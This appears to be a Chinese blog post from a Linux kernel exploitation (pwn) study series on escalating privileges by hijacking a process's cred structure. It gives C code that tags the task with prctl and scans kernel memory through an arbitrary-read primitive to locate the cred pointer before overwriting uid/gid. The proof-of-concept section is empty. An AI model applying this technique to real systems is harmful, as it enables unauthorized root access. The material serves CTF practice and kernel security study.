
[(15条消息) linux kernel pwn学习之劫持vdso_seaaseesa的博客-CSDN博客](https://bbs.kanxue.com/elink@58cK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8Y4y4W2j5h3q4K6k6h3g2K6j5g2)9J5c8X3q4J5N6r3W2U0L8r3g2Q4x3V1k6V1k6i4c8S2K9h3I4K6i4K6u0r3x3e0l9@1y4U0V1@1x3U0p5&6i4K6y4r3L8%4m8K6i4K6g2X3M7X3g2I4N6h3g2K6N6q4)9#2k6X3#2A6M7$3y4Q4x3@1c8Q4x3U0f1%4b7W2)9J5y4e0t1J5M7X3g2I4N6h3g2K6N6q4)9J5y4e0g2r3K9h3c8Q4x3U0f1J5x3W2)9J5y4e0y4m8i4K6t1#2x3U0t1I4y4U0x3@1y4U0V1H3z5o6t1#2x3e0j5%4z5o6l9K6y4e0M7J5x3U0M7J5x3o6W2Q4x3U0f1J5x3W2)9J5y4e0u0o6i4K6t1#2x3U0u0K6j5$3#2Q4x3U0f1J5x3W2)9J5y4e0y4m8i4K6t1#2x3U0t1J5x3o6p5@1x3o6M7I4x3#2)9J5k6e0p5K6x3o6p5H3x3U0x3K6y4q4)9J5k6i4m8U0i4K6t1#2y4f1k6T1L8r3!0Y4i4K6u0W2i4K6t1#2x3U0u0Q4x3U0f1%4c8q4)9J5y4X3q4E0M7q4)9K6b7Y4u0W2M7i4g2W2M7%4c8Q4y4h3k6A6k6q4)9K6c8o6p5$3x3K6b7$3z5e0l9^5x3U0f1I4y4U0M7^5x3o6x3#2y4K6t1J5y4K6t1H3z5g2)9J5y4X3q4E0M7q4)9K6b7X3u0A6P5W2)9#2k6X3W2V1i4K6y4p5x3q4)9J5y4X3q4E0M7q4)9K6b7Y4g2@1L8g2)9#2k6X3#2W2k6r3W2#2L8g2)9K6c8r3c8A6M7%4c8J5K9h3u0#2N6r3g2Q4x3X3g2H3j5#2)9#2k6Y4y4W2j5i4u0U0K9q4)9#2k6Y4u0W2M7%4g2D9N6q4)9J5k6h3&6G2L8X3g2Q4x3X3c8@1j5i4y4C8i4K6u0V1j5X3I4G2k6#2)9J5k6o6u0Q4y4@1g2T1L8r3!0Y4i4K6N6q4k6X3W2J5M7%4c8Q4y4h3k6J5j5h3&6C8i4K6g2X3N6U0u0Q4y4@1g2J5j5h3&6C8i4K6g2X3N6U0t1&6i4K6u0V1y4#2)9J5k6o6p5H3y4o6j5&6y4o6t1I4z5g2)9J5k6i4m8U0i4K6g2X3N6U0u0Q4y4h3k6J5j5h3&6C8i4K6g2X3j5X3I4G2k6#2)9#2k6X3c8W2k6X3q4#2L8s2c8Q4x3U0k6S2L8i4m8Q4x3@1u0#2N6r3#2Q4y4h3k6@1k6i4u0E0i4K6y4p5K9$3g2J5L8X3g2D9i4K6t1$3j5h3#2H3i4K6y4n7M7%4m8E0i4K6y4p5x3e0l9I4z5q4)9J5k6e0t1J5x3U0k6Q4x3X3f1K6x3o6l9I4i4K6u0W2y4o6b7#2x3l9`.`.)

还有bsauce师傅的简书：986K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2B7K9h3q4F1M7$3S2#2i4K6u0W2j5$3!0E0i4K6u0r3M7q4)9J5c8U0l9%4z5e0V1@1k6U0S2T1x3X3u0T1x3l9`.`.

## 2.劫持cred结构体

### (1)前置知识

这个没啥好讲的，就是覆盖`uid`和`gid`为零蛋就行，唯一需要的就是寻找`cred`的地址。

### (2)寻找地址

#### ①利用prctl函数

`task_struct`结构体是每个进程都会创建的一个结构体，保存当前进程的很多内容，其中就包括当前进程的`cred`结构体指针。

```c
// version 4.4.72
struct task_struct {
    ...
    /* process credentials */
    const struct cred __rcu *ptracer_cred;
    /* Tracer's credentials at attach */
    const struct cred __rcu *real_cred;
    /* objective and real subjective task credentials (COW) */
    const struct cred __rcu *cred;
    /* effective (overridable) subjective task credentials (COW) */
    char comm[TASK_COMM_LEN];
    ...
}
```

给出的题目编译在`4.4.72`内核下。

也就是可以将`comm[TASK_COMM_LEN]`设置为指定的字符串，相当于打个标记，不过不同版本中可能有所不同，不如最新版本`V5.14.13`的Linux内核就有所不同，其中还加了一个`key`结构体指针：

```c
// version 5.14.13
struct task_struct {
    ...
    const struct cred __rcu *ptracer_cred;
    const struct cred __rcu *real_cred;
    const struct cred __rcu *cred;
#ifdef CONFIG_KEYS
    /* Cached requested key. */
    struct key *cached_requested_key;
#endif
    char comm[TASK_COMM_LEN];
    ...
}
```

然后就可以利用`prctl`函数的`PR_SET_NAME`功能来设置`task_struct`结构体中的`comm[TASK_COMM_LEN]`成员。

```c
char target[16];
strcpy(target,"tryToFindPIG007");
prctl(PR_SET_NAME,target);
```

#### ②内存搜索定位

通过内存搜索，比对我们输入的标记字符串，可以定位`comm[TASK_COMM_LEN]`成员地址，比如设置标记字符串为`"tryToFindPIG007"`:

可以查看当前`Cred`结构中的内容：

```c
char *buf = (char *)calloc(1,0x1000);
puts("[+] we can read and write any memory");
for(;addr<0xffffc80000000000;addr+=0x1000){
    arbitrary_read(devFD,0x1000,buf,addr);
    result=memmem(buf,0x1000,target,16);
    if (result){
        printf("result:%p\n",result);
        cred = *(size_t *)(result-0x8);
        real_cred = *(size_t *)(result-0x10);
        /* if ((cred||0xff00000000000000) && (real_cred == cred)) */
        /* { */
        target_addr=addr+result-(int)(buf);
        printf("[+]found task_struct 0x%lx\n",target_addr);
        printf("[+]found cred 0x%lx\n",real_cred);
        break;
        /* } */
    }
}
```

#### ③任意写劫持cred

这个就不多说了，获取到`cred`地址之后直接写就行了

#### POC
